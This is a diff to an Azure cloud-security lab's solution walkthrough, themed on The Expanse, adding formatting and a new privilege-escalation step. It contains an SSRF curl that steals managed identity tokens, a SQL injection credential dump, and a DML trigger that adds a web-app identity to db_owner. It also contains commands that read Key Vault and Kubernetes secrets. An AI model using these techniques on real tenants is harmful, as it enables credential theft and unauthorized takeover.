@@ -20,7 +20,7 @@ are not exhaustive.
 
 ![Attack Navigation Chart](AzureLab_AttackChart.png)
 
-Vector source: `attacks/AzureLab_AttackChart.svg` (also exported as `.pdf` / `.png`).
+Vector source: [AzureLab_AttackChart.svg](AzureLab_AttackChart.svg) (also exported as [.pdf](AzureLab_AttackChart.pdf) / [.png](AzureLab_AttackChart.png)).
 
 ### Tycho-terminal web service
 
@@ -36,11 +36,11 @@ Take a look here:
 https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity?tabs=portal%2Chttp
 
 Curl solution:
-```
+```bash
 curl -s -v -X POST \
    -H "Content-Type: application/json" \
   "http://[tycho_fqdn]/api/proxy" \
-  --data '{"url": "http://[your_msi_endpoint]/msi/token?resource=https://vault.azure.net&api-version=2019-08-01", "headers":"X-IDENTITY-HEADER: [your_msi_secret]"}'
+  --data '{"url": "http://[your_msi_endpoint]/msi/token?resource=https://database.windows.net/&api-version=2019-08-01", "headers":"X-IDENTITY-HEADER: [your_msi_secret]"}'
 ```
 
 #### SQL Injection
@@ -48,7 +48,7 @@ curl -s -v -X POST \
 ![SQL injection: Tycho Terminal → tycho-db](snippets/sqli.png)
 
 The folks working for the OPA on the Tycho terminal clearly prioritize function over security. There are many ways to exploit this. One solution:
-```
+```sql
 ' union select id,subject_name,secret,principal_type, id from dbo.espionage_credentials;--
 ```
 
@@ -65,7 +65,7 @@ In the leaked environment variables the URL of the deployed source code can be f
 (This only works if you activated MFA for the user aburton)
 First, login as `aburton@yourdomain` via `az login`.
 Then: 
-```
+```bash
 az ssh vm -n Rocinante -g [rg_name]
 ```
 
@@ -128,7 +128,7 @@ This needs the "Get Managed Identity token on VM" technique to obtain a JWT toke
 Execute code on Scopuli using the access token via curl:
 
 Fill in the variable:
-```
+```bash
 SCO_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Scopuli"
 ```
 
@@ -151,7 +151,7 @@ EOF
 ![Scopuli → tycho-db (Owner)](snippets/scopuli_db.png)
 
 Scopuli has owner permissions for the tycho-db - (might be worth finding out why ;) ). This can be used to access the DB:
-```
+```bash
 sqlcmd -S tcp:[tycho_fqdn] -d tycho-db --authentication-method ActiveDirectoryDefault
 ```
 
@@ -161,7 +161,7 @@ sqlcmd -S tcp:[tycho_fqdn] -d tycho-db --authentication-method ActiveDirectoryDe
 
 The MI attached to `Scopuli` (`scopuli-sql-provisioner`) holds a custom role granting `RunCommand` / `Extensions/Write` on the `Donnager` Windows VM. From a foothold on `Scopuli`, grab the MI token (see "Get Managed Identity token on VM") and execute code on `Donnager`:
 
-```
+```bash
 DON_ID="/subscriptions/[your_sub_id]/resourceGroups/[your_rg]/providers/Microsoft.Compute/virtualMachines/Donnager"
 ```
 
@@ -294,6 +294,22 @@ SELECT TOP 5 ship, posted_by_login, status, ts FROM dbo.fleet_heartbeat ORDER BY
 
 `ALTER` on a table is enough to plant a DML trigger on it, and DML triggers run in the **caller's** security context — i.e. whoever inserts the next heartbeat row. Plant a trigger that adds your webapp MI to `db_owner` and wait one heartbeat tick. The reward is access to `dbo.protomolecule_samples`, a high-clearance table the webapp user can see but not read until they're db_owner.
 
+`SELECT name FROM sys.database_principals WHERE type = 'E' AND name LIKE 'tycho-terminal%';`
+gives the exact webapp MI name (it has a random suffix). Then:
+
+```sql
+CREATE OR ALTER TRIGGER dbo.trg_heartbeat_pwn
+ON dbo.fleet_heartbeat
+AFTER INSERT
+AS
+BEGIN
+    SET NOCOUNT ON;
+    -- only fires when the admin's heartbeat fires it.
+    IF IS_MEMBER('db_owner') = 1
+        ALTER ROLE db_owner ADD MEMBER [tycho-terminal-<paste real name>];
+END;
+```
+
 Note: `tycho-db` is Azure SQL Serverless and auto-pauses after 60 min idle. If your enumeration shows no recent heartbeat rows, you've probably caught the DB cold — your first connection wakes it, and the writer ticks again within a few minutes.
 
 
@@ -364,7 +380,7 @@ The blob is an `automation/tycho-db_export_runner.json` runner config with embed
 ![Exporter SP → Ganymede → Protomolecule → Contributor](snippets/exporter_kv.png)
 
 Log in with the SP creds from the loot blob (`az login --service-principal -u <client_id> -p <client_secret> -t <tenant_id>`). The exporter only needs its own storage connection string, but it was granted `Key Vault Secrets User` on the shared **Ganymede** vault — which also stores the `Protomolecule` SP creds. Read them:
-```
+```bash
 az keyvault secret list --vault-name Ganymede-<suffix> -o table
 az keyvault secret show --vault-name Ganymede-<suffix> -n Protomolecule-App-Secret --query value -o tsv
 ```
@@ -413,12 +429,12 @@ Swap the `resourceid` (`https://management.azure.com` for ARM, `https://vault.az
 ![AKS: Chrisjen → Earthfleet → fleet-ops-runner → Donnager](snippets/aks.png)
 
 First, log in as the Chrisjen SP
-```
+```bash
 az login --service-principal -u "[chrisjen_client_id]" --password '[chrisjen_client_secret]' -t tenant_id
 ```
 
 Get cluster credentials
-```
+```bash
 az aks get-credentials \
   --resource-group [rg_name] \
   --name un_fleet_[lab_uniq_id] \
@@ -426,12 +442,12 @@ az aks get-credentials \
 ```
 
 Convert to kubeconfig from Azure auth
-```
+```bash
 kubelogin convert-kubeconfig \
   -l azurecli
 ```
 Read secrets:
-```
+```bash
 kubectl get secrets -o json
 ```
 
@@ -439,7 +455,7 @@ The interesting one is `fleet-ops-runner`: a service-principal credential
 (`client_id` / `client_secret` / `tenant_id`) whose only privilege is
 `RunCommand` on the **Donnager** VM. From here you can abuse `JovianAccess` MI → `Ganymede` Key Vault → `Protomolecule` hop to reach
 resource-group Contributor:
-```
+```bash
 SECRET=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_secret}' | base64 -d)
 CID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.client_id}' | base64 -d)
 TID=$(kubectl get secret fleet-ops-runner -o jsonpath='{.data.tenant_id}' | base64 -d)
